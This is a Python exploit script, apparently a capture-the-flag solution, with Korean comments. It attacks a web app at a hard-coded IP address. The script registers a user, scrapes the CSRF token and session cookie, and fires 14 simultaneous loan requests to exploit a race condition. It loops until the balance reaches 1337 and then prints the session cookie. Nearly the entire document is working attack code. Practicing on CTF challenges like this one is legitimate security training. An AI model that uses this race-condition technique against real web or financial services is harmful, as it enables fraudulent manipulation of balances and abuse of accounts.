import requests
from threading import Thread
from bs4 import BeautifulSoup
import time
import re


headers = {'Content-Type': 'application/x-www-form-urlencoded'}
s = requests.Session()
session = ''

# Race condition 공격
def payload(data, cookies):
	global session
	session = ''
	url = "http://178.128.175.6:50090/"
	req = s.post(url,data=data,headers=headers,cookies=cookies)
	try:
		session = req.headers['Set-Cookie'] #현재 페이지의 세션값을 얻는다.
	except:
		pass

# 세션값만 추출하여 반환
def clearSession(ses):
	ses = ses[0]
	ses = ses.replace("session=",'')
	ses = ses.replace(";",'')
	return ses

def solve():
	global s
	count = 1
	while True:
		try:
			# 회원가입
			url = "http://178.128.175.6:50090/register"
			response = s.get(url)
			cookie = clearSession(response.headers['Set-Cookie'].split()) # 쿠키값 추출
			soup = BeautifulSoup(response.text,'html.parser')
			csrf = soup.find("input", {"name":"csrf_token"})['value'] # csrf_token값 추출 
			cookies = {'session':cookie}
			data = {'csrf_token':csrf,'username':"tjdwns"}
			s.post(url,data=data,headers=headers,cookies=cookies)
	
			# 로그인 한뒤 대출 코드 실행
			url = "http://178.128.175.6:50090/"
			response = s.get(url,headers=headers,cookies=cookies)	
			soup = BeautifulSoup(response.text,'html.parser')
			csrf = soup.find("input", {"name":"csrf_token"})['value']
			data = {'csrf_token':csrf,'loan':100}
			cookies = {'Cookie':cookie}

			Threading(data,cookies) # loan:100, csrf_token 
			# 현재 계정의 money값을 추출한다.
			url = "http://178.128.175.6:50090/"
			response = s.get(url,headers=headers,cookies=cookies)
			soup = BeautifulSoup(response.text,'html.parser')
			taglist = []
			for tag in soup.find_all("li"):
				taglist.append(tag.text)
			money = taglist[5]
			money = ''.join(re.findall("\d+.\d+", money))
			money = re.sub('[.]00', '', money) # 600.00 -> 600
			money = re.sub(',', '', money) # 1,000 -> 1000
			# money가 1337 이상이면 종료
			print(count,":",money,"money")
			if int(money) >= 1337:
				print(money + " money session \n" + clearSession(session.split()))
				break
			count = count+1
		except KeyError as e:
			s = requests.Session()

# Race condition 공격을 위한 쓰레드 생성
def Threading(data,cookies):
	th1 = Thread(target=payload, args=(data,cookies))
	th2 = Thread(target=payload, args=(data,cookies))
	th3 = Thread(target=payload, args=(data,cookies))
	th4 = Thread(target=payload, args=(data,cookies))
	th5 = Thread(target=payload, args=(data,cookies))
	th6 = Thread(target=payload, args=(data,cookies))
	th7 = Thread(target=payload, args=(data,cookies))
	th8 = Thread(target=payload, args=(data,cookies))
	th9 = Thread(target=payload, args=(data,cookies))
	th10 = Thread(target=payload, args=(data,cookies))
	th11 = Thread(target=payload, args=(data,cookies))
	th12 = Thread(target=payload, args=(data,cookies))
	th13 = Thread(target=payload, args=(data,cookies))
	th14 = Thread(target=payload, args=(data,cookies))
	
	th1.start()
	th2.start()
	th3.start()
	th4.start()
	th5.start()
	th6.start()
	th7.start()
	th8.start()
	th9.start()
	th10.start()
	th11.start()
	th12.start()
	th13.start()
	th14.start()
	
	th1.join()
	th2.join()
	th3.join()
	th4.join()
	th5.join()
	th6.join()
	th7.join()
	th8.join()
	th9.join()
	th10.join()
	th11.join()
	th12.join()
	th13.join()
	th14.join()
	
if __name__ == "__main__":
	solve()
